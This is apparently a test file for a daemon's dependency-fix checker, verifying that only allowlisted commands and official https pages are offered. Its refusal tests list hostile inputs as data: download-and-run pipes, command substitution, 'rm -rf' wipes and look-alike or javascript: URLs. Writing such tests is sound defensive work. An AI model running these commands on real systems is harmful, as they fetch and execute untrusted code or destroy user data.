import { describe, expect, test } from "bun:test";
import { safeFixCommand, safeFixUrl } from "@flightdeck/protocol";
import { checkDeps, type DepsEnv } from "../src/deps/deps.ts";

const bare = (platform: DepsEnv["platform"], linger: "on" | "off" = "off"): DepsEnv => ({
  platform,
  which: () => null,
  version: async () => null,
  allowedRoots: [],
  serviceInstalled: async () => false,
  linger: async () => linger,
  hooks: async () => "absent",
  account: async () => "signed_out",
});

describe("deps-fix-safe: only known fix commands and official pages are offered (HD-m1, HD-m2)", () => {
  test("every fix the daemon offers, on every system, is on the allowlist", async () => {
    for (const platform of ["linux", "darwin", "win32"] as const) {
      for (const linger of ["on", "off"] as const) {
        const { items } = await checkDeps(bare(platform, linger));
        for (const item of items) {
          for (const fix of item.fix) {
            if (fix.command)
              expect([item.id, fix.command, safeFixCommand(fix.command)]).toEqual([
                item.id,
                fix.command,
                true,
              ]);
            if (fix.url)
              expect([item.id, fix.url, safeFixUrl(fix.url)]).toEqual([item.id, fix.url, true]);
          }
        }
      }
    }
  });

  test("a download piped into a shell, a chained or substituted command and an unknown program are refused", () => {
    for (const command of [
      "curl -fsSL https://tailscale.com/install.sh | sh",
      "irm https://example.com/i.ps1 | iex",
      "Invoke-Expression (irm https://example.com)",
      'sh -c "$(curl -fsSL https://example.com/i.sh)"',
      "bash <(curl -s https://example.com/i.sh)",
      "curl -o x https://example.com/x && ./x",
      "wget https://example.com/x",
      "sudo apt install git; rm -rf ~",
      "sudo apt install git && echo hi",
      "sudo apt install $(whoami)",
      "sudo apt install `whoami`",
      "winget install --id Git.Git | xargs echo",
      "sudo rm -rf /",
      "",
    ]) {
      expect([command, safeFixCommand(command)]).toEqual([command, false]);
    }
  });

  test("a page is https, on an official host, with no credentials and no look-alike host", () => {
    expect(safeFixUrl("https://tailscale.com/download")).toBe(true);
    for (const url of [
      "http://tailscale.com/download",
      "https://evil.example/download",
      "https://tailscale.com.evil.example/download",
      "https://user:pw@tailscale.com/download",
      "javascript:alert(1)",
      "not a url",
    ]) {
      expect([url, safeFixUrl(url)]).toEqual([url, false]);
    }
  });
});
